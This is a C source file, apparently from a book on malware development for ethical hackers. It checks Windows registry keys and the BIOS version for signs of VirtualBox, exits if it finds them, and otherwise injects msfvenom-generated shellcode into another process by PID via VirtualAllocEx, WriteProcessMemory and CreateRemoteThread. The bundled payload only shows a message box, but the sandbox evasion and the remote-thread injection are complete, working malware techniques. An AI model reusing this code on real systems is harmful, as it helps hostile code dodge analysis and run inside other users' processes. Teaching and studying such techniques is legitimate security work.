/*
 * Malware Development for Ethical Hackers
 * hack.c - Anti-VM tricks
 * delaying execution
 * author: @cocomelonc
*/
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <windows.h>

// msfvenom -p windows/x64/messagebox TEXT="Hello world" TITLE="Packt" -b '\x00' -f c
unsigned char myPayload[] =
"\x48\x31\xc9\x48\x81\xe9\xdc\xff\xff\xff\x48\x8d\x05\xef\xff"
"\xff\xff\x48\xbb\x3b\xd5\x22\x45\xa5\xab\xe8\x28\x48\x31\x58"
"\x27\x48\x2d\xf8\xff\xff\xff\xe2\xf4\xc7\x9d\xa3\xa1\x55\x54"
"\x17\xd7\xd3\x05\x22\x45\xa5\xea\xb9\x69\x6b\x87\x73\x13\xed"
"\x9a\x3a\x4d\x73\x5e\x70\x25\x9b\xe3\x63\x7a\x23\xeb\x6a\xce"
"\xf7\x8b\xd6\x60\xb0\xa7\x72\x7b\xed\xa4\x5f\x62\x71\x98\x13"
"\x8c\xed\x9a\x28\x84\x07\xb4\x5e\x47\x89\x8b\xa9\xe9\xf2\xd8"
"\x63\x44\x64\x49\x05\x7a\x7a\x84\x1c\x0d\x2e\xf9\xc8\x16\xb0"
"\x97\x1e\x0d\xa4\x7b\xd6\xa3\xbb\x5d\x22\x45\xa5\xe3\x6d\xe8"
"\x4f\xba\x6a\x44\x75\xfb\xd6\xa3\x73\xcd\x1c\x01\x2e\xeb\xc8"
"\x61\x3a\x05\xc1\x19\xed\x54\x21\x16\x7a\x5e\x16\xcd\xed\xaa"
"\x3e\x65\x0a\x1c\x6a\x74\x65\x07\xa9\xe9\xf2\xd8\x63\x44\x64"
"\x93\x08\x5d\xca\xeb\x6e\x46\xe9\x8f\xe0\x6d\x02\x04\x57\x93"
"\xfd\x95\xac\xa3\x7b\xf1\x6b\x44\x75\xcd\xd6\x69\xb0\xd9\x6a"
"\x7b\xe1\x20\xa8\x34\x72\xd4\xf2\x7b\xe4\x20\xec\xa0\x73\xd4"
"\xf2\x04\xfd\xea\xb0\x76\x62\x8f\x63\x1d\xe4\xf2\xa9\x72\x73"
"\x56\xce\x65\xe4\xf9\x17\xc8\x63\x94\x7b\x1f\x9b\xe3\x63\x3a"
"\xd2\x9c\xdd\xba\x5a\xf6\xa1\xef\xfa\xd5\x22\x45\xa5\x95\xa0"
"\xa5\xae\x2b\x22\x45\xa5\x95\xa4\xa5\xbe\xdf\x23\x45\xa5\xe3"
"\xd9\xe1\x7a\x6f\x67\xc6\xf3\xac\x17\xfd\x73\xe4\xeb\x04\x1f"
"\x5b\x5d\x8a\x6d\x2a\xf7\x0d\xc0\xc7\x84\x47\x1b\xa2\x4d\x37"
"\xc9\xcf\xe8\x78\x5a\xb6\x49\x31\xa5\xab\xe8\x28";

unsigned int myPayloadLen = sizeof(myPayload);

int checkRegistryKey(HKEY rootKey, char* subKeyName) {
  HKEY registryKey = nullptr;
  LONG result = RegOpenKeyExA(rootKey, subKeyName, 0, KEY_READ, &registryKey);
  if (result == ERROR_SUCCESS) {
    RegCloseKey(registryKey);
    return TRUE;
  }
  return FALSE;
}

int compareRegistryKeyValue(HKEY rootKey, char* subKeyName, char* registryValue, char* comparisonValue) {
  HKEY registryKey = nullptr;
  LONG result;
  char value[1024];
  DWORD size = sizeof(value);
  result = RegOpenKeyExA(rootKey, subKeyName, 0, KEY_READ, &registryKey);
  if (result == ERROR_SUCCESS) {
    RegQueryValueExA(registryKey, registryValue, NULL, NULL, (LPBYTE)value, &size);
    if (result == ERROR_SUCCESS) {
      if (strcmp(value, comparisonValue) == 0) {
        return TRUE;
      }
    }
  }
  return FALSE;
}

int main(int argc, char* argv[]) {
  HANDLE processHandle; // Process handle
  HANDLE remoteThread;  // Remote thread
  PVOID remoteBuffer;   // Remote buffer

  if (checkRegistryKey(HKEY_LOCAL_MACHINE, "HARDWARE\\ACPI\\FADT\\VBOX__")) {
    printf("VirtualBox VM registry path value detected :(\n");
    return -2;
  }

  if (compareRegistryKeyValue(HKEY_LOCAL_MACHINE, "SYSTEM\\CurrentControlSet\\Control\\SystemInformation",
    "SystemProductName", "VirtualBox")) {
    printf("VirtualBox VM registry key value detected :(\n");
    return -2;
  }

  if (compareRegistryKeyValue(HKEY_LOCAL_MACHINE, "SYSTEM\\CurrentControlSet\\Control\\SystemInformation",
    "BiosVersion", "VirtualBox")) {
    printf("VirtualBox VM BIOS version detected :(\n");
    return -2;
  }

  // Parse process ID
  printf("PID: %i", atoi(argv[1]));
  processHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, DWORD(atoi(argv[1])));

  // Allocate memory buffer for remote process
  remoteBuffer = VirtualAllocEx(processHandle, NULL, myPayloadLen, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);

  // "Copy" data between processes
  WriteProcessMemory(processHandle, remoteBuffer, myPayload, myPayloadLen, NULL);

  // Our process starts a new thread
  remoteThread = CreateRemoteThread(processHandle, NULL, 0, (LPTHREAD_START_ROUTINE)remoteBuffer, NULL, 0, NULL);
  CloseHandle(processHandle);
  return 0;
}
